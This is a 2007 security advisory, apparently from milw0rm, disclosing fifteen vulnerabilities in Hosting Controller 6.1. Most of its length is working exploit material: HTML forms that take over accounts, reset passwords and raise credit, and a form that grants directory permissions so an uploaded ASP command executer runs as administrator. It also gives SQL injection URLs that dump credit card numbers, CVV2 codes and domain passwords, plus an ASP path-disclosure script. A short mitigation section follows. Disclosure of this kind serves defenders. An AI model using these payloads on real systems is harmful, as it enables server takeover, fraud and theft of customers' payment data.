@@ -1,0 +1,364 @@
+Title: Multiple Security Bugs In Hosting Controller
+Critical: Extremely critical
+Impact: Full system administrator access
+Vendor: Hosting Controller
+Version: 6.1 Hot fix <= 3.3
+Vendor URL: www.hostingcontroller.com
+Solution: N/A From company - There is temporary solution in this report
+Exploit: Available
+Release Date: 2007 - December
+Credit: www.BugReport.ir
+
+####################
+- Discussion:
+####################
+
+1- [Remote Attacker] can login to hosting controller Panel. He can also change all others' passwords.
+2- [User] can copy a file to hosting controller web directory which is executed under administrative privilege, so attacker can execute his commands by administrative privilege. e.g. an attacker can gain remote desktop of server using this bug and uploading an ASP file!
+3- [Remote Attacker] can make a new user.
+4- [Remote Attacker] can change all user's profiles.
+5- [User] can see all the database information by a SQL injection.
+6- [User] can change his credit amount or increase his discount.
+7- [User] can uninstall other's FrontPage extensions.
+8- [User] can delete all of gateway information.
+9- [User] can enable or disable pay type.
+10- [[User] can see all usernames in the server by "fp2000/NEWSRVR.asp".
+11- [User] can find Hosting Controller setup directory.
+12- [User] can import unwanted plan or change the plans.
+13- [Remote Attacker] can find web site path.
+14- [Remote Attacker] can enable or disable all Hosting Controller forums by SQL Injection.
+15- [User] can change other's host headers.
+
+[Remote attacker] = (Unauthorized user without any permission or access.)
+[User] = (A user with a simple account.)
+
+####################
+- Exploits: (or POCs)
+####################
+
+\\\\\\\\\\\\\\\\\\\\\
+/////////////////////
+
+1- [Remote Attacker] can login to hosting controller Panel. He can also change all others' passwords:
+    1.1- http://[HC URL]/hosting/addreseller.asp?reseller=[USERNAME]  -> for ex. [USERNAME]= resadmin
+    1.2- Now, to login without changing the password, attacker must run "ChangeDisplay.htm" then redirect to "main.asp"
+        ~~~~~~~~~~~~~~~~1.2.1 ChangeDisplay.htm~~~~~~~~~~~~~~~~~~~~~~~~
+            <script>
+            function check(){
+                _action = '/AdminSettings/displays.asp?DecideAction=1&ChangeSkin=1'
+                frmDisplay.action = window.document.all.URL.value + _action
+                return true;
+            }
+            </script>
+            URL: <input type="text" name="URL" />
+            <form name="frmDisplay" action="" method="post" onsubmit="return check()">
+            <input type="hidden" name="TemplateSkin" value="PanelXP/Blue" />
+            <input type="submit" />
+            </form>
+        ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+    1.3- Attacker, also can change username's password without having current password by "ChangePass.htm"
+        ~~~~~~~~~~~~~~~~1.3.1 ChangePass.htm~~~~~~~~~~~~~~~~~~~~~~~~
+            <script>
+            function check(){
+                _action = '/Accounts/AccountActions.asp?ActionType=UpdateUser'
+                frmChangePass.action = window.document.all.URL.value + _action
+                return true;
+            }
+            </script>
+            URL: <input type="text" name="URL" /><br />
+            <form name="frmChangePass" action="" method="post" onsubmit="return check()">
+            UserName: <input type="text" name="UserName" value="[USERNAME]" /> <br />
+            FullName: <input type="text" name="FullName" value="[USERNAME]" /> <br />
+            Description: <input type="text" name="Description" value="Something" /> <br />
+            Password: <input type="text" name="Pass1" value="" /> <br />
+            Confirm Password: <input type="text" name="ConfPass" value="" /> <br />
+            <input type="hidden" name="DefaultDiscount" value="0" />
+            <input type="hidden" name="CreditLimit" value="0" />
+            <input type="hidden" name="ActionType" value="AddUser" />
+            <input type="hidden" name="PassCheck" value="TRUE" />
+            <input type="submit" />
+            </form>
+        ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+
+\\\\\\\\\\\\\\\\\\\\\
+/////////////////////
+
+2- [User] can copy a file to hosting controller web directory which is executed under administrator's privilege, so attacker can execute his commands by administrator's privilege. For example attacker can gain remote desktop of server by this way and uploading an ASP file!
+This bug is because of "inc_newuser.asp" that can set full control permission on each "db","www","Special", or "log" directory on the server.
+This part is more complicated than the others, so we describe it more too.
+    2.1- We have a username, for ex. ?testuser? for a site like ?testuser.com?
+    2.2- Login by "testuser" and its password.
+ 2.3- Find Hosting Controller setup directory as we wrote it in part 11. (default directory is ?C:\Program Files\Advanced Communications\Hosting Controller\web\admin\?)
+    2.4- Find ?testuser.com? IIS username by uploading a file or by seeing all system user (part 10) or by your experience (username for ?testuser.com? is always like ?testusercom_web? )
+    2.5- Drag & drop "SetPermission.htm" to your current browser's window (that is logged in Hosting Controller) and fill it.
+        ~~~~~~~~~~~~~~~~2.5.1 SetPermission.htm~~~~~~~~~~~~~~~~~~~~~~~~
+            <pre>
+            This file set full permission on "DB" directory of "forum"
+            So you can upload your file there and execute your command with administrator permission.
+            </pre>
+            <script language="javascript">
+            function check(){
+                _action = '/accounts/AccountActions.asp?ActionType=AddUser'
+                _forumdir = '\\forum|1'
+                frmPermission.action = frmPermission.URL.value + _action
+                frmPermission.Dirroot.value = frmPermission.hcpath.value + _forumdir
+                if(frmPermission.NewName.value.length>20){
+                    alert('Enter a username less than 20 char like ASPNET');
+                    frmPermission.NewName.focus();
+                    return false;
+                }else return true;
+            }
+            </script>
+            <form name="frmPermission" action="" method="post" onsubmit="return check()">
+            Site URL: <input type="text" name="URL" size="30"> <font size="2">like: http://tesuser.com:8077 or http://testuser.com/admin</font><br>
+            Username (less than 20): <input type="text" name="NewName" size="30"> <font size="2">like: ASPNET or testusercom_web </font><br>
+            HC Files Path (no back-slash at end): <input type="text" name="hcpath" size="30"> <font size="2">like: C:\Program Files\Advanced Communications\Hosting Controller\web\admin</font><br>
+
+            <br>
+            <input type="hidden" name="Dirroot">
+            <input type="hidden" value="db" name="anything1">
+
+            <br>
+            <input type="submit" value="Go!">
+            <input type="reset" value="Reset">
+            </form>
+        ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+    2.6- If you see ?Error: 70500170 : User already exists in either OS or Database.? Means that all the thing are OK!, and your permission has already set.
+    2.7- Now you have a full access to "[HCPATH]\Forum\DB".
+     Note: You can do that with "[HCPATH]\phpBB\phpBB\db" too because there is "db" directory too.
+   2.8- So you can upload your command executer there, but you need a file uploader at first on "testuser.com" to upload your command executer on "[HCPATH]\Forum\DB".
+ 2.9- If your permission has not been set correctly, its always because of limitation on making a new user. So you must login with username's reseller and make a new plan with making some new user accounts permission then sell it to your username. Also, you can increase your credit amount (part 6) and buy a plan with a lot of web accounts then select it and do these operation from the first. (Note: This vulnerability works properly and there is no exception like the others!)
+
+\\\\\\\\\\\\\\\\\\\\\
+/////////////////////
+
+3- [Remote Attacker] can make a new user.
+    3.1- Goto http://[HC URL]/hosting/default.asp?referral="http://"
+    3.2- Then http://[HC URL]/hosting/selectdomain.asp?htype=HTYPE
+    3.3- Then http://[HC URL]/hosting/addsubsite.asp?reseller=resadmin&loginname=Bugreport&password=something&email=Admin@Bugreport.ir&DomainName=Bugreport.com
+
+\\\\\\\\\\\\\\\\\\\\\
+/////////////////////
+
+4- [Remote Attacker] can change all user's profiles.
+ 4.1- Use "Change Profiles.htm"
+        ~~~~~~~~~~~~~~~~4.1.1 ChangeProfiles.htm~~~~~~~~~~~~~~~~~~~~~~~~
+   <script>
+            function check(){
+                _action = '/Hosting/Addreseller.asp?loginname=ResAdmin'
+                frmChangeProfile.action = window.document.all.URL.value + _action
+                return true;
+            }
+            </script>
+            URL: <input type="text" name="URL" /><br />
+            <form name="frmChangeProfile" action="" method="post" onsubmit="return check()">
+                UserName: <input type="text" name="loginname" value="Victim User" /> <br />
+                first name: <input type="text" name="first_name" value="" /> <br />
+                last name: <input type="text" name="last_name" value="" /> <br />
+                description: <input type="text" name="description" value="" /> <br />
+                company: <input type="text" name="company" value="" /> <br />
+                email: <input type="text" name="email" value="User's Actual Email Address" /> <br />
+                country: <input type="text" name="country" value="" /> <br />
+                state: <input type="text" name="state" value="" /> <br />
+                city: <input type="text" name="city" value="" /> <br />
+                address: <input type="text" name="address" value="" /> <br />
+                phone: <input type="text" name="phone" value="" /> <br />
+                fax: <input type="text" name="fax" value="" /> <br />
+                zip: <input type="text" name="zip" value="" /> <br />
+                <input type="submit" />
+            </form>
+        ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+        Note: "ResAdmin" in "_action" can change to "hcadmin" or an another valid username.
+    4.2- Now Goto: http://[HC URL]/hosting/xml_addresellerresult.asp
+    4.3- A user can inject a SQL query in "Email" or "Loginname" field to change user's profile without having his email address too.
+
+\\\\\\\\\\\\\\\\\\\\\
+/////////////////////
+
+5- [User] can see all the database information by a SQL injection.
+ 5.1- Some exploits are:
+        ~~~~~~~~~~~~~~~~5.1.1 Exploits~~~~~~~~~~~~~~~~~~~~~~~~
+            ---See all users
+            http://[HC URL]/accounts/accountmanager.asp?iconwebsite=&search=1&sortaction=1&sortfield=name union select Name,FullName,Description,AdminLevel From Admin_List where 1=1 order by name
+            ---AdminProp
+            http://[HC URL]/accounts/accountmanager.asp?iconwebsite=&search=1&sortaction=1&sortfield=name union select propname,adminname,propvalue,propname From Adminprop where 1=1 order by name
+            ---SQL SERVER
+            http://[HC URL]/accounts/accountmanager.asp?iconwebsite=&search=1&sortaction=1&sortfield=name union select Databasename,Owner,Loginname,Servername From SQLServer where 1=1 order by name
+            ---IISPasswords
+            http://[HC URL]/accounts/accountmanager.asp?iconwebsite=&search=1&sortaction=1&sortfield=name union select FolderID,WebsiteID,User,Folder From IISPasswords where 1=1 order by name
+            ---CreditCards
+            http://[HC URL]/accounts/accountmanager.asp?iconwebsite=&search=1&sortaction=1&sortfield=name union select creditcardno,expdate,isEncrypted,cvv2 From creditcard where 1=1 order by name
+            ---DSN
+            http://[HC URL]/accounts/accountmanager.asp?iconwebsite=&search=1&sortaction=1&sortfield=name union select DSNName,DSNOwner,FilePath,Driver From DSN where 1=1 order by name
+            ---Domain Registration
+            http://[HC URL]/accounts/accountmanager.asp?iconwebsite=&search=1&sortaction=1&sortfield=name union select domainname,domainpassword,ns1,ns1_IP From DomainRegistration where 1=1 order by name
+            ---Domai nRegistration Info
+            http://[HC URL]/accounts/accountmanager.asp?iconwebsite=&search=1&sortaction=1&sortfield=name union select custname,accountlogin,accountpass,authoritytype >From DomainRegistrationInfo where 1=1 order by name
+            ---GateWays
+            http://[HC URL]/accounts/accountmanager.asp?iconwebsite=&search=1&sortaction=1&sortfield=name union select creditcardno,CVV2,Amount,expdate From GateWays where 1=1 order by name
+        ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+
+\\\\\\\\\\\\\\\\\\\\\
+/////////////////////
+
+6- [User] can change his credit amount or increase his discount.
+    6.1- User can increase his credit or discount by "ChangeCredit.htm"
+            ~~~~~~~~~~~~~~~~6.1.1 ChangeCredit.htm~~~~~~~~~~~~~~~~~~~~~~~~
+            <script>
+            function check(){
+                _action = '/Accounts/AccountActions.asp?ActionType=UpdateUser'
+                frmChangePass.action = window.document.all.URL.value + _action
+                return true;
+            }
+            </script>
+            URL: <input type="text" name="URL" /><br />
+            <form name="frmChangePass" action="" method="post" onsubmit="return check()">
+            UserName: <input type="text" name="UserName" value="[USERNAME]" /> <br />
+            FullName: <input type="text" name="FullName" value="[USERNAME]" /> <br />
+            Description: <input type="text" name="Description" value="Something" /> <br />
+            DefaultDiscount: <input type="text" name="DefaultDiscount" value="100" /> <br />
+            CreditLimit: <input type="text" name="CreditLimit" value="9999" /> <br />
+            <input type="hidden" name="ActionType" value="AddUser" />
+            <input type="hidden" name="PassCheck" value="False" />
+            <input type="submit" />
+            </form>
+        ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+
+\\\\\\\\\\\\\\\\\\\\\
+/////////////////////
+
+7- [User] can uninstall other's FrontPage extensions.
+ 7.1- A user can uninstall other's FrontPage extensions by sending server "host" id (IIS) value to "http://[HC URL]/fp2002/UNINSTAL.asp" by POST method.
+
+\\\\\\\\\\\\\\\\\\\\\
+/////////////////////
+
+8- [User] can delete all of gateway information.
+ 8.1- By using "http://[HC URL]/OpenApi/GatewayVariables.asp" directly.
+ 8.2- Also by a SQL Injection in "http://[HC URL]/OpenApi/GatewayVariables.asp?GateWayID=1 or 1=1 or 1=1".
+
+\\\\\\\\\\\\\\\\\\\\\
+/////////////////////
+
+9- [User] can enable or disable pay type.
+ 9.1- By using "http://[HC URL]/adminsettings/choosetranstype.asp" directly.
+
+\\\\\\\\\\\\\\\\\\\\\
+/////////////////////
+
+10- [[User] can see all usernames in the server by "fp2000/NEWSRVR.asp".
+ 10.1- Some exploits are:
+     http://[HC URL]/fp2000/NEWSRVR.asp?AdminName=OWNERNAME&AdminLevel=reseller
+        http://[HC URL]/fp2000/NEWSRVR.asp?AdminName=hcadmin&AdminLevel=host
+        And for all usernames: http://[HC URL]/fp2000/NEWSRVR.asp?AdminName=&AdminLevel=
+
+\\\\\\\\\\\\\\\\\\\\\
+/////////////////////
+
+11- [User] can find Hosting Controller setup directory.
+ 11.1- This exploit run locally so the url is like: "http://localhost:8077/hosting/css.asp?AutoHost=resadmin'"
+ 11.2- To see it locally you can use "FindMap.asp"
+            ~~~~~~~~~~~~~~~~11.2.1 FindMap.asp~~~~~~~~~~~~~~~~~~~~~~~~
+                <%@LANGUAGE="VBSCRIPT" CODEPAGE="1252"%>
+                <%
+                Check = 1 ' Change to 1,2,3,4 if you can't get the proper answer
+
+                If Check =1 then
+                '-------------------------------------------------------------------------
+                    Set xml = Server.CreateObject("Microsoft.XMLHTTP")
+                    xml.Open "Get", "http://127.0.0.1:8077/hosting/css.asp?AutoHost=resadmin'", False
+                '-------------------------------------------------------------------------
+                ElseIf Check =2 Then
+                '-------------------------------------------------------------------------
+                    Set xml = Server.CreateObject("Microsoft.XMLHTTP")
+                    xml.Open "Get", "http://localhost:8077/hosting/css.asp?AutoHost=resadmin'", False
+                '-------------------------------------------------------------------------
+                ElseIf Check =3 Then
+                '-------------------------------------------------------------------------
+                    Set xml = Server.CreateObject("MSXML2.XMLHTTP")
+                    xml.Open "Get", "http://127.0.0.1:8077/hosting/css.asp?AutoHost=resadmin'", False
+                '-------------------------------------------------------------------------
+                ElseIf Check =4 Then
+                '-------------------------------------------------------------------------
+                    Set xml = Server.CreateObject("MSXML2.XMLHTTP")
+                    xml.Open "Get", "http://localhost:8077/hosting/css.asp?AutoHost=resadmin'", False
+                '-------------------------------------------------------------------------
+                End If
+
+                xml.setRequestHeader "lastCached", now()
+                xml.setRequestHeader "Content-Type","application/x-www-form-urlencoded"
+                xml.Send TotalInputPOST
+                FileContent = xml.getResponseHeader("Content-Type")
+                strHtmlContent = xml.responseText
+                i = instrrev(strHtmlContent,"../common/SqlInject.asp")
+                j = instrrev(strHtmlContent,"size=2>",i)
+                Response.Write("<b>"&mid(strHtmlContent,j+7,i-j-15)&"</b>")
+                %>
+                <%set oScriptNet=Server.CreateObject("Wscript.Network")%>
+                <br />
+                <pre>
+                Computer Name: <%=oScriptNet.ComputerName%>
+                User: <%=oScriptNet.UserName%>   (You are seeing this page by this user)
+                Both: \\<%=oScriptNet.ComputerName%>\\<%=oScriptNet.UserName%>
+                User Length=<%If Len(oScriptNet.UserName)<=20 Then Response.Write(" OK :)") Else Response.Write(" False :( More than 20 chars so you must use from other username like ASPNET")%></pre>
+        ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+
+\\\\\\\\\\\\\\\\\\\\\
+/////////////////////
+
+12- [User] can import unwanted plan or change the plans.
+ 12.1- To import a plan use "http://[HC URL]/hosting/importhostingplans.asp" directly.
+    12.2- To change a plan use something like "http://[HC URL]/hosting/AutoSignUpPlans.asp?save=1&30=ON&d_30=1" directly.
+
+\\\\\\\\\\\\\\\\\\\\\
+/////////////////////
+
+13- [Remote Attacker] can find web site path.
+ 13.1- When forum is not available, or it is not default, "http://[HC URL]/admin/forum/" shows website path with an error.
+
+\\\\\\\\\\\\\\\\\\\\\
+/////////////////////
+
+14- [Remote Attacker] can enable or disable all Hosting Controller forums by SQL Injection.
+ 14.1- This is because of a SQL Injection in "/forum/HCSpecific/DisableForum.asp" and "/forum/HCSpecific/EnableForum.asp"
+     "http://[HC URL]//forum/HCSpecific/DisableForum.asp?action=disableforum&ForumID=1 or 1=1"
+  "http://[HC URL]//forum/HCSpecific/DisableForum.asp?action=disableforum&ForumID=1 or 1=1"
+
+\\\\\\\\\\\\\\\\\\\\\
+/////////////////////
+
+15- [User] can change other's host headers.
+ 15.1- This is because of "/IIS/iibind.asp" which accept the parameter without any checking. Also, this file has potential for dangerous SQL Injection.
+
+
+####################
+- Solution:
+####################
+
+Unfortunately, there is no support from hosting controller about these bugs. Also, they told us that there is no more support for HC 6.1.
+Fast Solution:
+Delete or rename these files which are in "Hosting Controller\web\admin\":
+- "/hosting/addreseller.asp"
+- "/Accounts/AccountActions.asp"
+- "/hosting/addsubsite.asp"
+- "/hosting/xml_addresellerresult.asp"
+- "/accounts/accountmanager.asp"
+- "/fp2002/UNINSTAL.asp"
+- "/OpenApi/GatewayVariables.asp"
+- "/fp2000/NEWSRVR.asp"
+- "/hosting/importhostingplans.asp"
+- "/hosting/AutoSignUpPlans.asp"
+- "/forum/HCSpecific/DisableForum.asp"
+- "/forum/HCSpecific/EnableForum.asp"
+- "/IIS/iibind.asp"
+
+Also, you can contact "admin[4t}bugreport{d0t]ir" to fix all these bugs for you without changing or deleting any file if you want.
+
+####################
+- Credit :
+####################
+
+AmnPardaz Security Research Team - www.Bugreport.ir
+Contact: admin[4t}bugreport{d0t]ir
+
+# milw0rm.com [2007-12-13]
